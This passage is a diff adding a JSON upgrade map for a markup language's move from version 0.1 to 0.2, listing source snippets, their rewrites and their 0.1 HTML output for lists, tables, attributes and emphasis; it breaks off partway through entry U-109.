@@ -1,0 +1,3811 @@
+{
+  "$schema": "schemas/upgrade-map.schema.json",
+  "source": [
+    {
+      "id": "U-001",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "Some text\n# Heading\n",
+      "to": "Some text\n\n# Heading\n",
+      "meaning02": "<p>Some text\n# Heading</p>",
+      "toolEntry": "U-001",
+      "silent": true
+    },
+    {
+      "id": "U-002",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "Some text\n> quote\n",
+      "to": "Some text\n\n> quote\n",
+      "meaning02": "<p>Some text\n&gt; quote</p>",
+      "toolEntry": "U-002",
+      "silent": true
+    },
+    {
+      "id": "U-003",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "Some text\n{.x}\nNext block\n",
+      "to": "Some text\n\n{.x}\nNext block\n",
+      "meaning02": "<p>Some text\n{.x}\nNext block</p>",
+      "toolEntry": "U-003",
+      "silent": true
+    },
+    {
+      "id": "U-004",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "Some text\n:: term\n: description\n",
+      "to": "Some text\n\n:: term\n: description\n",
+      "meaning02": "<p>Some text\n:: term\n: description</p>",
+      "toolEntry": "U-004",
+      "silent": true
+    },
+    {
+      "id": "U-005",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "Some text\n[ref]: https://example.com\n\nSee [ref][].\n",
+      "to": "Some text\n\n[ref]: https://example.com\n\nSee [ref][].\n",
+      "meaning02": "<p>Some text\n[ref]: https://example.com</p>\n<p>See [ref][].</p>",
+      "toolEntry": "U-005",
+      "silent": true
+    },
+    {
+      "id": "U-006",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "- item text\n# Heading\n",
+      "to": "- item text\n\n# Heading\n",
+      "meaning02": "<ul>\n  <li>item text\n# Heading</li>\n</ul>",
+      "toolEntry": "U-006",
+      "silent": true
+    },
+    {
+      "id": "U-007",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "> - a\n- b\n",
+      "to": "> - a\n\n- b\n",
+      "meaning02": "<blockquote>\n  <ul>\n    <li>a\n- b</li>\n  </ul>\n</blockquote>",
+      "toolEntry": "U-007",
+      "silent": true
+    },
+    {
+      "id": "U-008",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": ":: term\n: desc\n- item\n",
+      "to": ":: term\n: desc\n\n- item\n",
+      "meaning02": "<dl>\n  <dt>term</dt>\n  <dd>desc\n- item</dd>\n</dl>",
+      "toolEntry": "U-008",
+      "silent": true
+    },
+    {
+      "id": "U-009",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "- text\n  :: term\n  : desc\n",
+      "to": "- text\n\n  :: term\n  : desc\n",
+      "meaning02": "<ul>\n  <li>text\n:: term\n: desc</li>\n</ul>",
+      "toolEntry": "U-009",
+      "silent": true
+    },
+    {
+      "id": "U-010",
+      "kind": "rewrite",
+      "group": "paragraphs and blocks",
+      "from": "| a | b |\n^ Caption\n# Heading\n",
+      "to": "| a | b |\n^ Caption\n\n# Heading\n",
+      "meaning02": "<table>\n  <caption>Caption</caption>\n  <tbody>\n    <tr><td>a</td><td>b</td></tr>\n  </tbody>\n</table>\n<section id=\"Heading\">\n  <h1>Heading</h1>\n</section> Since the ruling of 24 November (#6508) a caption continues only on lines indented past its caret (C2-B-148, C2-B-234), so the 0.2 HTML is the 0.1 HTML and the blank line the tool writes changes nothing.",
+      "toolEntry": "U-010",
+      "silent": false
+    },
+    {
+      "id": "U-011",
+      "kind": "report",
+      "group": "paragraphs and blocks",
+      "from": "Some text\n{{ other.crv }}\n",
+      "to": "Some text\n{{ other.crv }}\n",
+      "meaning02": "<p>Some text\n{{ other.crv }}</p>",
+      "toolEntry": "U-011",
+      "silent": false
+    },
+    {
+      "id": "U-012",
+      "kind": "none",
+      "group": "paragraphs and blocks",
+      "from": "Some text\n- item\n",
+      "to": "Some text\n- item\n",
+      "meaning02": "<p>Some text\n- item</p>",
+      "toolEntry": "U-012",
+      "silent": false
+    },
+    {
+      "id": "U-013",
+      "kind": "none",
+      "group": "paragraphs and blocks",
+      "from": "Some text\n| a | b |\n\nSome text\n```\ncode\n```\n\nSome text\n***\nmore\n",
+      "to": "Some text\n| a | b |\n\nSome text\n```\ncode\n```\n\nSome text\n***\nmore\n",
+      "meaning02": "<p>Some text</p>\n<table>\n  <tbody>\n    <tr><td>a</td><td>b</td></tr>\n  </tbody>\n</table>\n<p>Some text</p>\n<pre><code>code\n</code></pre>\n<p>Some text</p>\n<hr>\n<p>more</p>",
+      "toolEntry": "U-013",
+      "silent": false
+    },
+    {
+      "id": "U-014",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": "- step one\n+\n> a note\n- step two\n",
+      "to": "- step one\n\n  > a note\n- step two\n",
+      "meaning02": "<ul>\n  <li>step one\n+\n&gt; a note</li>\n  <li>step two</li>\n</ul>",
+      "toolEntry": "U-014",
+      "silent": true
+    },
+    {
+      "id": "U-015",
+      "kind": "report",
+      "group": "lists",
+      "from": "- a\n+\nsecond\n- b\n",
+      "to": "- a\n\n  second\n- b\n",
+      "meaning02": "<ul>\n  <li>a\n+\nsecond</li>\n  <li>b</li>\n</ul> The `+` line is text in 0.2. The spelling with a blank line, `- a`, a blank line, `  second`, `- b`, keeps `second` in the item as a second paragraph, `<li>a\n    <p>second</p>\n  </li>`, but 0.1 wrote that later paragraph of a tight item bare, `<li>a\n    second\n  </li>`, and in 0.2 every paragraph of an item but the first gets `<p>` (C2-H-034, U-019), so no 0.2 source gives the 0.1 HTML.",
+      "toolEntry": "U-015",
+      "silent": true
+    },
+    {
+      "id": "U-016",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": "> quoted\n+\n- a list inside the quote\n",
+      "to": "> quoted\n>\n> - a list inside the quote\n",
+      "meaning02": "<blockquote><p>quoted\n+\n- a list inside the quote</p></blockquote>",
+      "toolEntry": "U-016",
+      "silent": true
+    },
+    {
+      "id": "U-017",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": "- +\n  ```\n  code\n  ```\n- two\n",
+      "to": "- ```\n  code\n  ```\n- two\n",
+      "meaning02": "<ul>\n  <li>+\n    <pre><code>code\n</code></pre>\n  </li>\n  <li>two</li>\n</ul>",
+      "toolEntry": "U-017",
+      "silent": true
+    },
+    {
+      "id": "U-018",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": "- a\n\n  second\n- b\n",
+      "to": "- a\n\n  second\n\n- b\n",
+      "meaning02": "<ul>\n  <li>a\n    <p>second</p>\n  </li>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-018",
+      "silent": true
+    },
+    {
+      "id": "U-019",
+      "kind": "report",
+      "group": "lists",
+      "from": "- # Heading\n  more\n- b\n",
+      "to": "- # Heading\n  more\n- b\n",
+      "meaning02": "<ul>\n  <li>\n    <h1 id=\"Heading\">Heading</h1>\n    <p>more</p>\n  </li>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-019",
+      "silent": true
+    },
+    {
+      "id": "U-020",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": "{loose}\n- a\n- b\n",
+      "to": "- a\n\n- b\n",
+      "meaning02": "<ul loose=\"\">\n  <li>a</li>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-020",
+      "silent": true
+    },
+    {
+      "id": "U-021",
+      "kind": "report",
+      "group": "lists",
+      "from": "{loose}\n- Note text.\n",
+      "to": "- Note text.\n",
+      "meaning02": "<ul loose=\"\">\n  <li>Note text.</li>\n</ul>",
+      "toolEntry": "U-021",
+      "silent": true
+    },
+    {
+      "id": "U-023",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": "- item text\n 3. child\n",
+      "to": "- item text\n3. child\n",
+      "meaning02": "<ul>\n  <li>item text\n3. child</li>\n</ul>",
+      "toolEntry": "U-023",
+      "silent": true
+    },
+    {
+      "id": "U-025",
+      "kind": "report",
+      "group": "lists",
+      "from": "1234567890. x\n",
+      "to": "{start=1234567890}\n. x\n",
+      "meaning02": "<p>1234567890. x</p>",
+      "toolEntry": "U-025",
+      "silent": true
+    },
+    {
+      "id": "U-026",
+      "kind": "rewrite",
+      "group": "lists",
+      "from": "- a\n%%%\nx\n%%%\n- b\n",
+      "to": "- a\n  %%%\n  x\n  %%%\n- b\n",
+      "meaning02": "<ul>\n  <li>a</li>\n</ul>\n<ul>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-026",
+      "silent": true
+    },
+    {
+      "id": "U-027",
+      "kind": "none",
+      "group": "lists",
+      "from": "- a\n\n\n\n- b\n",
+      "to": "- a\n\n\n\n- b\n",
+      "meaning02": "<ul>\n  <li>a</li>\n</ul>\n<ul>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-027",
+      "silent": false
+    },
+    {
+      "id": "U-028",
+      "kind": "none",
+      "group": "lists",
+      "from": "- one\n* two\n",
+      "to": "- one\n* two\n",
+      "meaning02": "<ul>\n  <li>one</li>\n</ul>\n<ul>\n  <li>two</li>\n</ul>",
+      "toolEntry": "U-028",
+      "silent": false
+    },
+    {
+      "id": "U-029",
+      "kind": "none",
+      "group": "lists",
+      "from": "- a\n%% c\n- b\n",
+      "to": "- a\n%% c\n- b\n",
+      "meaning02": "<ul>\n  <li>a</li>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-029",
+      "silent": false
+    },
+    {
+      "id": "U-030",
+      "kind": "none",
+      "group": "lists",
+      "from": "A. Smith went home.\n\nA.  one\nB.  two\n",
+      "to": "A. Smith went home.\n\nA.  one\nB.  two\n",
+      "meaning02": "<p>A. Smith went home.</p>\n<ol type=\"A\">\n  <li>one</li>\n  <li>two</li>\n</ol>",
+      "toolEntry": "U-030",
+      "silent": false
+    },
+    {
+      "id": "U-031",
+      "kind": "rewrite",
+      "group": "attributes",
+      "from": "{.note}\n\nParagraph.\n",
+      "to": "{.note}\nParagraph.\n",
+      "meaning02": "<p>{.note}</p>\n<p>Paragraph.</p>",
+      "toolEntry": "U-031",
+      "silent": true
+    },
+    {
+      "id": "U-032",
+      "kind": "rewrite",
+      "group": "attributes",
+      "from": "{.a\n .b}\nParagraph.\n",
+      "to": "{.a .b}\nParagraph.\n",
+      "meaning02": "<p>{.a\n.b}\nParagraph.</p>",
+      "toolEntry": "U-032",
+      "silent": true
+    },
+    {
+      "id": "U-033",
+      "kind": "rewrite",
+      "group": "attributes",
+      "from": "- a\n{.x}\n- b\n",
+      "to": "- a\n\n{.x}\n- b\n",
+      "meaning02": "<ul>\n  <li>a\n{.x}</li>\n  <li>b</li>\n</ul>",
+      "toolEntry": "U-033",
+      "silent": true
+    },
+    {
+      "id": "U-034",
+      "kind": "rewrite",
+      "group": "attributes",
+      "from": "Paragraph.\n\n{.x}\n",
+      "to": "Paragraph.\n",
+      "meaning02": "<p>Paragraph.</p>\n<p>{.x}</p>",
+      "toolEntry": "U-034",
+      "silent": true
+    },
+    {
+      "id": "U-035",
+      "kind": "none",
+      "group": "attributes",
+      "from": "{.a}{#b}\nParagraph.\n",
+      "to": "{.a}{#b}\nParagraph.\n",
+      "meaning02": "<p id=\"b\" class=\"a\">Paragraph.</p>",
+      "toolEntry": "U-035",
+      "silent": true
+    },
+    {
+      "id": "U-036",
+      "kind": "report",
+      "group": "attributes",
+      "from": "{.a #b}\nParagraph.\n\n[x]{.a #b}\n",
+      "to": "{.a #b}\nParagraph.\n\n[x]{.a #b}\n",
+      "meaning02": "<p id=\"b\" class=\"a\">Paragraph.</p>\n<p><span id=\"b\" class=\"a\">x</span></p>",
+      "toolEntry": "U-036",
+      "silent": true
+    },
+    {
+      "id": "U-037",
+      "kind": "rewrite",
+      "group": "attributes",
+      "from": "```js{1,3}\na\n```\n",
+      "to": "```js\na\n```\n",
+      "meaning02": "<pre><code class=\"language-js\">a\n</code></pre>",
+      "toolEntry": "U-037",
+      "silent": false
+    },
+    {
+      "id": "U-038",
+      "kind": "rewrite",
+      "group": "definitions",
+      "from": "> See [ref][].\n>\n> [ref]: https://example.com\n\nOutside [ref][].\n",
+      "to": "> See [ref][].\n\n[ref]: https://example.com\n\nOutside [ref][].\n",
+      "meaning02": "<blockquote>\n  <p>See [ref][].</p>\n  <p>[ref]: https://example.com</p>\n</blockquote>\n<p>Outside [ref][].</p>",
+      "toolEntry": "U-038",
+      "silent": true
+    },
+    {
+      "id": "U-039",
+      "kind": "rewrite",
+      "group": "definitions",
+      "from": "Text [a][].\n\n [a]: /u\n",
+      "to": "Text [a][].\n\n[a]: /u\n",
+      "meaning02": "<p>Text [a][].</p>\n<p>[a]: /u</p>",
+      "toolEntry": "U-039",
+      "silent": true
+    },
+    {
+      "id": "U-040",
+      "kind": "rewrite",
+      "group": "definitions",
+      "from": "[a]: /one\n[a]: /two\n\n[x][a]\n",
+      "to": "[a]: /two\n\n[x][a]\n",
+      "meaning02": "<p><a href=\"/one\">x</a></p>",
+      "toolEntry": "U-040",
+      "silent": true
+    },
+    {
+      "id": "U-041",
+      "kind": "rewrite",
+      "group": "definitions",
+      "from": "*[HTML]: First\n*[HTML]: Second\n\nHTML here.\n",
+      "to": "*[HTML]: Second\n\nHTML here.\n",
+      "meaning02": "<p><abbr title=\"First\">HTML</abbr> here.</p>",
+      "toolEntry": "U-041",
+      "silent": true
+    },
+    {
+      "id": "U-042",
+      "kind": "none",
+      "group": "definitions",
+      "from": "Text[^n].\n\n[^n]: first\n[^n]: second\n",
+      "to": "Text[^n].\n\n[^n]: first\n[^n]: second\n",
+      "meaning02": "<p>Text<a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a>.</p>\n<section role=\"doc-endnotes\" aria-label=\"Footnotes\">\n  <hr>\n  <ol>\n    <li id=\"fn1\">\n      <p>first<a href=\"#fnref1\" role=\"doc-backlink\" aria-label=\"Back to reference\">↩</a></p>\n    </li>\n  </ol>\n</section>",
+      "toolEntry": "U-042",
+      "silent": false
+    },
+    {
+      "id": "U-043",
+      "kind": "none",
+      "group": "headings",
+      "from": "# One\n# Two\n",
+      "to": "# One\n# Two\n",
+      "meaning02": "<section id=\"One\">\n  <h1>One</h1>\n</section>\n<section id=\"Two\">\n  <h1>Two</h1>\n</section>",
+      "toolEntry": "U-043",
+      "silent": false
+    },
+    {
+      "id": "U-044",
+      "kind": "rewrite",
+      "group": "breaks",
+      "from": "para\n\n---\n\nnext\n\n___\n\n-----\n",
+      "to": "para\n\n***\n\nnext\n\n***\n\n***\n",
+      "meaning02": "<p>para</p>\n<p>—</p>\n<p>next</p>\n<p>___</p>\n<p>—–</p>",
+      "toolEntry": "U-044",
+      "silent": true
+    },
+    {
+      "id": "U-045",
+      "kind": "rewrite",
+      "group": "breaks",
+      "from": "* * *\n\n- - -\n",
+      "to": "***\n\n***\n",
+      "meaning02": "<ul>\n  <li>\n    <ul>\n      <li>*</li>\n    </ul>\n  </li>\n</ul>\n<ul>\n  <li>\n    <ul>\n      <li>-</li>\n    </ul>\n  </li>\n</ul>",
+      "toolEntry": "U-045",
+      "silent": true
+    },
+    {
+      "id": "U-046",
+      "kind": "none",
+      "group": "breaks",
+      "from": "_ _ _\n",
+      "to": "_ _ _\n",
+      "meaning02": "<p>_ _ _</p>",
+      "toolEntry": "U-046",
+      "silent": false
+    },
+    {
+      "id": "U-047",
+      "kind": "none",
+      "group": "frontmatter",
+      "from": "--- toml\na = 1\n---\ntext\n",
+      "to": "--- toml\na = 1\n---\ntext\n",
+      "meaning02": "<p>text</p>",
+      "toolEntry": "U-047",
+      "silent": false
+    },
+    {
+      "id": "U-048",
+      "kind": "none",
+      "group": "frontmatter",
+      "from": "---markdown\na = 1\n---\ntext\n",
+      "to": "---markdown\na = 1\n---\ntext\n",
+      "meaning02": "<p>text</p>",
+      "toolEntry": "U-048",
+      "silent": false
+    },
+    {
+      "id": "U-049",
+      "kind": "rewrite",
+      "group": "fences, quotes, comments",
+      "from": "```\ncode\n   ```\nafter\n",
+      "to": "````\ncode\n   ```\nafter\n````\n",
+      "meaning02": "<pre><code>code\n</code></pre>\n<p>after</p>",
+      "toolEntry": "U-049",
+      "silent": true
+    },
+    {
+      "id": "U-050",
+      "kind": "rewrite",
+      "group": "fences, quotes, comments",
+      "from": "%%%\nhidden\n%%% visible?\nafter\n",
+      "to": "%%%\nhidden\nvisible?\n%%%\nafter\n",
+      "meaning02": "",
+      "toolEntry": "U-050",
+      "silent": true
+    },
+    {
+      "id": "U-052",
+      "kind": "rewrite",
+      "group": "fences, quotes, comments",
+      "from": "::: |\none\n%% hidden\ntwo\n:::\n",
+      "to": "::: |\none\n{% hidden %}\ntwo\n:::\n",
+      "meaning02": "<div class=\"line-block\">\n  <p>one<br>\n%% hidden<br>\ntwo</p>\n</div>",
+      "toolEntry": "U-052",
+      "silent": true
+    },
+    {
+      "id": "U-053",
+      "kind": "report",
+      "group": "fences, quotes, comments",
+      "from": "- item\n\n\t```\n\tx\n\t\ty\n\t```\n",
+      "to": "- item\n\n\t```\n\tx\n\t    y\n\t```\n",
+      "meaning02": "<ul>\n  <li>item\n    <pre><code>x\n\ty\n</code></pre>\n  </li>\n</ul> The tab after the content column stays in the code in 0.2. The spelling with four spaces gives the 0.1 code text, `x\n    y`, but 0.1 also made this one-item list loose, `<li><p>item</p>`, and a list with one item is tight in 0.2, its first paragraph bare (C2-B-062, C2-H-034), so no 0.2 source gives the 0.1 HTML.",
+      "toolEntry": "U-053",
+      "silent": true
+    },
+    {
+      "id": "U-054",
+      "kind": "none",
+      "group": "fences, quotes, comments",
+      "from": "{title=\"T\"}\n```js\ncode\n```\n",
+      "to": "{title=\"T\"}\n```js\ncode\n```\n",
+      "meaning02": "<pre title=\"T\"><code class=\"language-js\">code\n</code></pre>",
+      "toolEntry": "U-054",
+      "silent": false
+    },
+    {
+      "id": "U-055",
+      "kind": "rewrite",
+      "group": "tables",
+      "from": "| a | b |\n|---|--:|\n| 1 | 2 |\n",
+      "to": "|= a |={>} b |\n| 1 | 2 |\n",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td>a</td><td>b</td></tr>\n    <tr><td>—</td><td>–:</td></tr>\n    <tr><td>1</td><td>2</td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-055",
+      "silent": true
+    },
+    {
+      "id": "U-056",
+      "kind": "rewrite",
+      "group": "tables",
+      "from": "|=< a |=> b |=~ c |\n| 1 | 2 | 3 |\n",
+      "to": "|={<} a |={>} b |={~} c |\n| 1 | 2 | 3 |\n",
+      "meaning02": "<table>\n  <thead>\n    <tr><th scope=\"col\">&lt; a</th><th scope=\"col\">&gt; b</th><th scope=\"col\">~ c</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>1</td><td>2</td><td>3</td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-056",
+      "silent": true
+    },
+    {
+      "id": "U-057",
+      "kind": "rewrite",
+      "group": "tables",
+      "from": "| a | b \\|\n",
+      "to": "| a | b \\| |\n",
+      "meaning02": "<p>| a | b |</p>",
+      "toolEntry": "U-057",
+      "silent": true
+    },
+    {
+      "id": "U-058",
+      "kind": "rewrite",
+      "group": "tables",
+      "from": "{header-rows=1}\n| a | b |\n| 1 | 2 |\n",
+      "to": "|= a |= b |\n| 1 | 2 |\n",
+      "meaning02": "<table>\n  <thead>\n    <tr><td>a</td><td>b</td></tr>\n  </thead>\n  <tbody>\n    <tr><td>1</td><td>2</td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-058",
+      "silent": true
+    },
+    {
+      "id": "U-059",
+      "kind": "report",
+      "group": "tables",
+      "from": "{footer-rows=1}\n|= a |= b |\n",
+      "to": "{footer-rows=1}\n|= a |= b |\n",
+      "meaning02": "<table>\n  <thead>\n    <tr><th scope=\"col\">a</th><th scope=\"col\">b</th></tr>\n  </thead>\n</table>",
+      "toolEntry": "U-059",
+      "silent": true
+    },
+    {
+      "id": "U-060",
+      "kind": "report",
+      "group": "tables",
+      "from": "|= a |= b |\n| ^ | 2 |\n| 3 | 4 |\n",
+      "to": "|= a |= b |\n| ^ | 2 |\n| 3 | 4 |\n",
+      "meaning02": "<table>\n  <thead>\n    <tr><th scope=\"col\">a</th><th scope=\"col\">b</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>^</td><td>2</td></tr>\n    <tr><td>3</td><td>4</td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-060",
+      "silent": true
+    },
+    {
+      "id": "U-061",
+      "kind": "report",
+      "group": "tables",
+      "from": "{table}\n```csv\na,\"b\nc,d\n```\n",
+      "to": "{table}\n```csv\na,\"b\nc,d\n```\n",
+      "meaning02": "<table>\n  <thead>\n    <tr><th scope=\"col\">a</th><th scope=\"col\">b\nc,d</th></tr>\n  </thead>\n</table>",
+      "toolEntry": "U-061",
+      "silent": true
+    },
+    {
+      "id": "U-062",
+      "kind": "none",
+      "group": "tables",
+      "from": "| a | b\n| c | d\n",
+      "to": "| a | b\n| c | d\n",
+      "meaning02": "<p>| a | b\n| c | d</p>",
+      "toolEntry": "U-062",
+      "silent": false
+    },
+    {
+      "id": "U-063",
+      "kind": "rewrite",
+      "group": "captions",
+      "from": "| a | b |\n\n^ Caption\n",
+      "to": "| a | b |\n^ Caption\n",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td>a</td><td>b</td></tr>\n  </tbody>\n</table>\n<p>^ Caption</p>",
+      "toolEntry": "U-063",
+      "silent": true
+    },
+    {
+      "id": "U-064",
+      "kind": "none",
+      "group": "captions",
+      "from": "```js\nlet x = 1\n```\n^ Listing one\n",
+      "to": "```js\nlet x = 1\n```\n^ Listing one\n",
+      "meaning02": "<figure>\n  <pre><code class=\"language-js\">let x = 1\n</code></pre>\n  <figcaption>Listing one</figcaption>\n</figure>",
+      "toolEntry": "U-064",
+      "silent": false
+    },
+    {
+      "id": "U-065",
+      "kind": "rewrite",
+      "group": "inline emphasis and typography",
+      "from": "an _underlined_ word and snake_case and _id\n",
+      "to": "an {_underlined_} word and snake_case and _id\n",
+      "meaning02": "<p>an _underlined_ word and snake_case and _id</p> A slash immediately after the braced underline can become bare emphasis under C2-I-046 through C2-I-048 and must be escaped when 0.1 left it literal. Where the underlined text starts with `name=`, see U-267.",
+      "toolEntry": "U-065",
+      "silent": true
+    },
+    {
+      "id": "U-066",
+      "kind": "rewrite",
+      "group": "inline emphasis and typography",
+      "from": "a ~struck~ word and ~/config\n",
+      "to": "a {~struck~} word and ~/config\n",
+      "meaning02": "<p>a ~struck~ word and ~/config</p>",
+      "toolEntry": "U-066",
+      "silent": true
+    },
+    {
+      "id": "U-067",
+      "kind": "rewrite",
+      "group": "inline emphasis and typography",
+      "from": "a =marked= word and x =1, y= 2\n",
+      "to": "a {=marked=} word and x {=1, y=} 2\n",
+      "meaning02": "<p>a =marked= word and x =1, y= 2</p>",
+      "toolEntry": "U-067",
+      "silent": true
+    },
+    {
+      "id": "U-068",
+      "kind": "rewrite",
+      "group": "inline emphasis and typography",
+      "from": "/*bold italic*/ and */bold italic/*\n",
+      "to": "*/bold italic/* and */bold italic/*\n",
+      "meaning02": "<p><em><strong>bold italic</strong></em> and <strong><em>bold italic</em></strong></p>",
+      "toolEntry": "U-068",
+      "silent": true
+    },
+    {
+      "id": "U-069",
+      "kind": "rewrite",
+      "group": "inline emphasis and typography",
+      "from": "{~old~>new~}\n",
+      "to": "{-old-}{+new+}\n",
+      "meaning02": "<p><s>old~&gt;new</s></p>",
+      "toolEntry": "U-069",
+      "silent": true
+    },
+    {
+      "id": "U-070",
+      "kind": "rewrite",
+      "group": "inline emphasis and typography",
+      "from": "*bold {/note*/} more*\n",
+      "to": "*bold {/note\\*/} more*\n",
+      "meaning02": "<p><strong>bold {/note</strong>/} more*</p>",
+      "toolEntry": "U-070",
+      "silent": true
+    },
+    {
+      "id": "U-071",
+      "kind": "rewrite",
+      "group": "inline emphasis and typography",
+      "from": "said 'Bob and left.\n",
+      "to": "said ’Bob and left.\n",
+      "meaning02": "<p>said ‘Bob and left.</p>",
+      "toolEntry": "U-071",
+      "silent": true
+    },
+    {
+      "id": "U-072",
+      "kind": "report",
+      "group": "inline emphasis and typography",
+      "from": "a*{#b} c #}\n",
+      "to": "a*{#b} c #}\n",
+      "meaning02": "<p>a*{#b} c #}</p>",
+      "toolEntry": "U-072",
+      "silent": true
+    },
+    {
+      "id": "U-073",
+      "kind": "report",
+      "group": "inline emphasis and typography",
+      "from": "see config:items[0] and :smile: and x:smile:\n",
+      "to": "see config:items[0] and :smile: and x:smile:\n",
+      "meaning02": "<p>see config:items[0] and :smile: and x:smile:</p>",
+      "toolEntry": "U-073",
+      "silent": true
+    },
+    {
+      "id": "U-074",
+      "kind": "none",
+      "group": "inline emphasis and typography",
+      "from": "***bold italic*** here\n",
+      "to": "***bold italic*** here\n",
+      "meaning02": "<p>***bold italic*** here</p>",
+      "toolEntry": "U-074",
+      "silent": false
+    },
+    {
+      "id": "U-075",
+      "kind": "none",
+      "group": "references and footnotes",
+      "from": "See [^n](/u).\n\n[^n]: Note.\n",
+      "to": "See [^n](/u).\n\n[^n]: Note.\n",
+      "meaning02": "<p>See <a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a>(/u).</p>\n<section role=\"doc-endnotes\" aria-label=\"Footnotes\">\n  <hr>\n  <ol>\n    <li id=\"fn1\">\n      <p>Note.<a href=\"#fnref1\" role=\"doc-backlink\" aria-label=\"Back to reference\">↩</a></p>\n    </li>\n  </ol>\n</section>",
+      "toolEntry": "U-075",
+      "silent": false
+    },
+    {
+      "id": "U-076",
+      "kind": "report",
+      "group": "HTML",
+      "from": "```=html\n<b>x</b>\n```\n",
+      "to": "```=html\n<b>x</b>\n```\n",
+      "meaning02": "<pre><code class=\"language-html\">&lt;b&gt;x&lt;/b&gt;\n</code></pre>",
+      "toolEntry": "U-076",
+      "silent": true
+    },
+    {
+      "id": "U-077",
+      "kind": "report",
+      "group": "HTML",
+      "from": "a `<b>x</b>`{=html} b\n",
+      "to": "a `<b>x</b>`{=html} b\n",
+      "meaning02": "<p>a &lt;b&gt;x&lt;/b&gt; b</p>",
+      "toolEntry": "U-077",
+      "silent": true
+    },
+    {
+      "id": "U-078",
+      "kind": "none",
+      "group": "HTML",
+      "from": "a <b>bold</b> tag\n",
+      "to": "a <b>bold</b> tag\n",
+      "meaning02": "<p>a &lt;b&gt;bold&lt;/b&gt; tag</p>",
+      "toolEntry": "U-078",
+      "silent": false
+    },
+    {
+      "id": "U-079",
+      "kind": "report",
+      "group": "host options",
+      "from": "(host render options)",
+      "to": "(review host options)",
+      "meaning02": "(depends on host options)",
+      "toolEntry": "U-079",
+      "silent": false
+    },
+    {
+      "id": "U-101",
+      "kind": "escape",
+      "group": "new block shapes",
+      "from": "= 4 is the answer\nand more.\n",
+      "to": "\\= 4 is the answer\nand more.\n",
+      "meaning02": "<section id=\"s-4-is-the-answer\">\n  <h1>4 is the answer</h1>\n  <p>and more.</p>\n</section>",
+      "toolEntry": "U-101",
+      "silent": true
+    },
+    {
+      "id": "U-102",
+      "kind": "escape",
+      "group": "new block shapes",
+      "from": "# Heading\n  indented text\n",
+      "to": "# Heading\nindented text\n",
+      "meaning02": "<section id=\"Heading-indented-text\">\n  <h1>Heading\nindented text</h1>\n</section>",
+      "toolEntry": "U-102",
+      "silent": true
+    },
+    {
+      "id": "U-103",
+      "kind": "escape",
+      "group": "new block shapes",
+      "from": "a. one\nb. two\n",
+      "to": "a\\. one\nb. two\n",
+      "meaning02": "<ol type=\"a\">\n  <li>one</li>\n  <li>two</li>\n</ol>",
+      "toolEntry": "U-103",
+      "silent": true
+    },
+    {
+      "id": "U-104",
+      "kind": "escape",
+      "group": "new block shapes",
+      "from": "::: > \"T\"\nquoted\n:::\n",
+      "to": "\\::: > \"T\"\nquoted\n:::\n",
+      "meaning02": "<blockquote><p>quoted</p></blockquote>",
+      "toolEntry": "U-104",
+      "silent": true
+    },
+    {
+      "id": "U-105",
+      "kind": "escape",
+      "group": "new block shapes",
+      "from": "```=html \"T\"\n<b>x</b>\n```\n",
+      "to": "{%%}```=html \"T\"\n<b>x</b>```\n```\n",
+      "meaning02": "<pre><code class=\"language-html\">&lt;b&gt;x&lt;/b&gt;\n</code></pre>",
+      "toolEntry": "U-105",
+      "silent": true
+    },
+    {
+      "id": "U-106",
+      "kind": "escape",
+      "group": "new block shapes",
+      "from": ":: term\nmore term text\n: first description\n",
+      "to": ":: term\n\nmore term text\n: first description\n",
+      "meaning02": "<dl>\n  <dt>term</dt>\n</dl>\n<p>more term text\n: first description</p> Since the ruling of 24 November (#6508) a term continues only on lines indented past its mark (C2-B-069, C2-B-234), so the 0.2 HTML is the 0.1 HTML and the blank line the tool writes changes nothing.",
+      "toolEntry": "U-106",
+      "silent": false
+    },
+    {
+      "id": "U-107",
+      "kind": "escape",
+      "group": "new block shapes",
+      "from": "| a | b |\n^ first\n^ second\n",
+      "to": "| a | b |\n^ first\n\n^ second\n",
+      "meaning02": "<table>\n  <caption>first</caption>\n  <tbody>\n    <tr><td>a</td><td>b</td></tr>\n  </tbody>\n</table>\n<p>^ second</p> Since the ruling of 24 November (#6508) a caret line directly below a caption is text (C2-B-148, C2-B-149), so the 0.2 HTML is the 0.1 HTML and the blank line the tool writes changes nothing.",
+      "toolEntry": "U-107",
+      "silent": false
+    },
+    {
+      "id": "U-108",
+      "kind": "escape",
+      "group": "new block shapes",
+      "from": "| a | b | {.r}\n",
+      "to": "| a | b | \\{.r}\n",
+      "meaning02": "<table>\n  <tbody>\n    <tr class=\"r\"><td>a</td><td>b</td></tr>\n  </tbody>\n</table>",
+      "toolEntry": "U-108",
+      "silent": true
+    },
+    {
+      "id": "U-109",
+      "kind": "escape",
+      "group": "new block shapes",
